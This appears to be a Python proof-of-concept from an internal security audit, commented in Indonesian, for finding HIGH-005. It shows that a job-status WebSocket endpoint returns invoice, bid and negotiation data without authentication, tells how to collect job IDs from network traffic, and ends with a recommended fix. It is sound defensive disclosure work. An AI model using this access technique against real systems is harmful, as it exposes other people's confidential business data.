#!/usr/bin/env python3
"""
PoC: HIGH-005 — WebSocket /ws/jobs/{job_id} Tidak Ada Autentikasi
=================================================================
Demonstrasi bahwa endpoint WebSocket job status bisa diakses TANPA
token apapun — siapapun yang mengetahui job_id bisa melihat hasilnya.

TUJUAN DEMO:
  Membuktikan data sensitif (invoice OCR, bid analysis, negosiasi)
  bisa diakses tanpa login hanya dengan mengetahui job_id.

CARA MENJALANKAN:
  pip install websockets requests
  python HIGH-005-websocket-no-auth.py

SAFETY: Read-only. Hanya membaca data, tidak mengubah apapun.
        Gunakan job_id yang sudah ada di DEV environment.
"""

import asyncio
import json
import sys

try:
    import websockets
except ImportError:
    print("Install dulu: pip install websockets")
    sys.exit(1)

# ──────────────────────────────────────────────
# KONFIGURASI — sesuaikan sebelum menjalankan
# ──────────────────────────────────────────────
WS_BASE = "ws://localhost:8000"  # WebSocket backend URL

# Job ID bisa didapat dari:
# 1. Network traffic saat user yang login menggunakan aplikasi (inspect browser)
# 2. Atau isi manual jika sudah punya job_id dari DEV
EXAMPLE_JOB_IDS = [
    # Isi dengan job_id aktual dari DEV environment
    # Format biasanya UUID: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    "PLACEHOLDER_JOB_ID_1",
    "PLACEHOLDER_JOB_ID_2",
]


def separator(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


async def try_connect_without_auth(job_id: str) -> dict:
    """Coba connect ke WebSocket TANPA token auth."""
    url = f"{WS_BASE}/ws/jobs/{job_id}"
    print(f"\n  Mencoba: {url}")
    print("  Headers: (tidak ada Authorization token)")

    result = {
        "job_id": job_id,
        "connected": False,
        "data_received": None,
        "error": None,
    }

    try:
        async with websockets.connect(
            url,
            additional_headers={},  # Sengaja TIDAK ada Authorization header
            open_timeout=5,
        ) as websocket:
            result["connected"] = True
            print("  \033[91m→ KONEKSI BERHASIL (tanpa token!)\033[0m")

            # Terima beberapa pesan
            messages = []
            try:
                for _ in range(3):
                    msg = await asyncio.wait_for(websocket.recv(), timeout=3)
                    data = json.loads(msg)
                    messages.append(data)
                    print(f"  \033[91m→ Data diterima: {json.dumps(data, indent=2)[:200]}\033[0m")
            except asyncio.TimeoutError:
                pass  # Tidak ada lebih banyak pesan

            result["data_received"] = messages

    except websockets.exceptions.ConnectionClosedError as e:
        result["error"] = f"Connection closed: {e.code} — {e.reason}"
        if e.code == 4401:
            print("  \033[92m→ Server menolak (code 4401) — autentikasi bekerja!\033[0m")
        else:
            print(f"  → Connection closed: {e.code} {e.reason}")

    except websockets.exceptions.InvalidStatus as e:
        result["error"] = f"HTTP {e.response.status_code}"
        print(f"  → Server menolak dengan HTTP {e.response.status_code}")

    except Exception as e:
        result["error"] = str(e)
        print(f"  → Error: {e}")

    return result


async def try_connect_with_valid_token(job_id: str, valid_token: str) -> dict:
    """Bandingkan: connect DENGAN token valid."""
    url = f"{WS_BASE}/ws/jobs/{job_id}"
    print(f"\n  Mencoba dengan token valid: {url}")

    result = {"job_id": job_id, "connected": False, "data_received": None}

    try:
        async with websockets.connect(
            url,
            additional_headers={"Authorization": f"Bearer {valid_token}"},
            open_timeout=5,
        ) as websocket:
            result["connected"] = True
            print("  \033[92m→ Koneksi berhasil dengan token valid\033[0m")

            try:
                msg = await asyncio.wait_for(websocket.recv(), timeout=3)
                result["data_received"] = json.loads(msg)
            except asyncio.TimeoutError:
                pass

    except Exception as e:
        result["error"] = str(e)

    return result


async def demonstrate_unauthenticated_enumeration():
    """Demo: mencoba beberapa job_id tanpa auth."""
    separator("HIGH-005 PoC — Unauthenticated WebSocket Access")
    print(
        """
  SKENARIO:
  Attacker/orang luar mendapat 1 job_id (misalnya dari network sniff
  atau bocor di error message). Apakah mereka bisa baca data job result
  TANPA login?

  YANG AKAN DIBUKTIKAN:
  /ws/jobs/{job_id} tidak memeriksa JWT token → data langsung dikirim.

  DAMPAK BISNIS:
  • Invoice OCR results — dokumen keuangan sensitif
  • Bid Analysis results — data tender & penawaran kompetitor
  • Negotiation Factsheet — strategi negosiasi kontrak
  Semua bisa dibaca tanpa akun.
"""
    )

    if EXAMPLE_JOB_IDS[0] == "PLACEHOLDER_JOB_ID_1":
        print("  \033[93m⚠ PERHATIAN: Isi EXAMPLE_JOB_IDS dengan job_id aktual dari DEV!\033[0m")
        print(
            """
  Cara mendapatkan job_id dari DEV:
  1. Login ke aplikasi DEV dengan akun test
  2. Buka Developer Tools → Network tab → filter 'ws'
  3. Lihat WebSocket connection: wss://.../ws/jobs/XXXX-XXXX
  4. Salin job_id dan masukkan ke EXAMPLE_JOB_IDS di atas
  
  Atau bisa juga via API:
  curl -H "Authorization: Bearer TOKEN" http://localhost:8000/api/v1/jobs/
"""
        )
        # Lanjutkan demo dengan job_id contoh untuk menunjukkan logic
        print("\n  Menjalankan demo dengan job_id placeholder...")

    results = []
    for job_id in EXAMPLE_JOB_IDS[:2]:  # Test maksimal 2 job_id
        print(f"\n  --- Mencoba job_id: {job_id[:20]}... ---")
        r = await try_connect_without_auth(job_id)
        results.append(r)
        await asyncio.sleep(0.5)

    # Ringkasan
    separator("HASIL DEMO")
    successful = [r for r in results if r["connected"]]

    if successful:
        print(f"\n  \033[91m╔══════════════════════════════════════════════════╗\033[0m")
        print(f"  \033[91m║  VULNERABILITY CONFIRMED!                       ║\033[0m")
        print(f"  \033[91m║  {len(successful)}/{len(results)} job_id berhasil diakses TANPA TOKEN  ║\033[0m")
        print(f"  \033[91m╚══════════════════════════════════════════════════╝\033[0m")

        for r in successful:
            if r["data_received"]:
                print(f"\n  Data yang bocor untuk job {r['job_id'][:20]}:")
                print(f"  {json.dumps(r['data_received'], indent=4)[:500]}")
    else:
        print("\n  Semua job_id ditolak atau placeholder. Cek:")
        print("  1. Apakah backend berjalan?")
        print("  2. Apakah job_id valid?")
        for r in results:
            print(f"  • {r['job_id'][:20]}: {r.get('error', 'No error')}")

    separator("PERBANDINGAN: Chatbot WS (sudah aman) vs Jobs WS (tidak aman)")
    print(
        """
  WebSocket Chatbot (/ws/chatbot/{session_id}):
  ✓ Membaca token dari header 'sec-websocket-protocol'
  ✓ Validasi JWT sebelum kirim data
  ✓ Menutup koneksi dengan code 4401 jika token invalid/tidak ada

  WebSocket Jobs (/ws/jobs/{job_id}):
  ✗ Langsung 'await websocket.accept()' tanpa cek token
  ✗ Kirim seluruh job result ke siapapun yang konek
  ✗ Tidak ada log siapa yang mengakses

  FIX YANG DIPERLUKAN:
  → Copy pola autentikasi dari chatbot_ws ke job_status_ws
  → Tambahkan validasi job ownership (user hanya bisa lihat job miliknya)
"""
    )


if __name__ == "__main__":
    asyncio.run(demonstrate_unauthenticated_enumeration())
